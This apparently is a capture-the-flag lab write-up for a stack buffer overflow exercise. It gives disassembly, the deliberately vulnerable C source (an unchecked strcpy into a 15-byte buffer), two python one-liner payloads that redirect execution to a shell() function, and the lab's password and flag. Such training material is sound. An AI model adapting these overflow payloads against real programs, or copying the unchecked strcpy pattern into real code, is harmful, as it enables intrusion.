## Lab2B
1m_all_ab0ut_d4t_b33f
```
gdb-peda$ i functions 
All defined functions:

Non-debugging symbols:
0x08048538  _init
0x08048570  printf@plt
0x08048580  strcpy@plt
0x08048590  system@plt
0x080485a0  __gmon_start__@plt
0x080485b0  __libc_start_main@plt
0x080485c0  _start
0x080485f0  __x86.get_pc_thunk.bx
0x08048600  deregister_tm_clones
0x08048630  register_tm_clones
0x08048670  __do_global_dtors_aux
0x08048690  frame_dummy

0x080486bd  shell

0x080486d0  print_name
0x080486fd  main
0x08048740  __libc_csu_init
0x080487b0  __libc_csu_fini
0x080487b4  _fini

```

```
Dump of assembler code for function print_name:
   0x080486d0 <+0>:     push   ebp
   0x080486d1 <+1>:     mov    ebp,esp
   0x080486d3 <+3>:     sub    esp,0x28
   0x080486d6 <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080486d9 <+9>:     mov    DWORD PTR [esp+0x4],eax
   0x080486dd <+13>:    lea    eax,[ebp-0x17]
   0x080486e0 <+16>:    mov    DWORD PTR [esp],eax
   0x080486e3 <+19>:    call   0x8048580 <strcpy@plt>
   0x080486e8 <+24>:    lea    eax,[ebp-0x17]
   0x080486eb <+27>:    mov    DWORD PTR [esp+0x4],eax
   0x080486ef <+31>:    mov    DWORD PTR [esp],0x80487d8
   0x080486f6 <+38>:    call   0x8048570 <printf@plt>
   0x080486fb <+43>:    leave  
   0x080486fc <+44>:    ret    
End of assembler dump.
```

```
Dump of assembler code for function shell:
   0x080486bd <+0>:     push   ebp
   0x080486be <+1>:     mov    ebp,esp
   0x080486c0 <+3>:     sub    esp,0x18
   0x080486c3 <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080486c6 <+9>:     mov    DWORD PTR [esp],eax
   0x080486c9 <+12>:    call   0x8048590 <system@plt>
   0x080486ce <+17>:    leave  
   0x080486cf <+18>:    ret    
End of assembler dump.
```

First solution I came up with, couldn't figure out why it doesn't work.
`./lab2B $(python -c 'print "A"*19+"\xd0\x97\x04\x08"+ "\x9c\xf6\xff\xbf" + "\xc3\x86\x04\x08"')`

Much simpler, straightforward solution  
`./lab2B $(python -c 'print "A"*27 + "\xbd\x86\x04\x08" + "A"*4 + "\xd0\x97\x04\x08" ')`


**`i_c4ll_wh4t_i_w4nt_n00b`**

***

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/*
 * compiled with:
 * gcc -O0 -fno-stack-protector lab2B.c -o lab2B
 */

char* exec_string = "/bin/sh";

void shell(char* cmd)
{
        system(cmd);
}

void print_name(char* input)
{
        char buf[15];
        strcpy(buf, input);
        printf("Hello %s\n", buf);
}

int main(int argc, char** argv)
{
        if(argc != 2)
        {
                printf("usage:\n%s string\n", argv[0]);
                return EXIT_FAILURE;
        }

        print_name(argv[1]);

        return EXIT_SUCCESS;
}
```
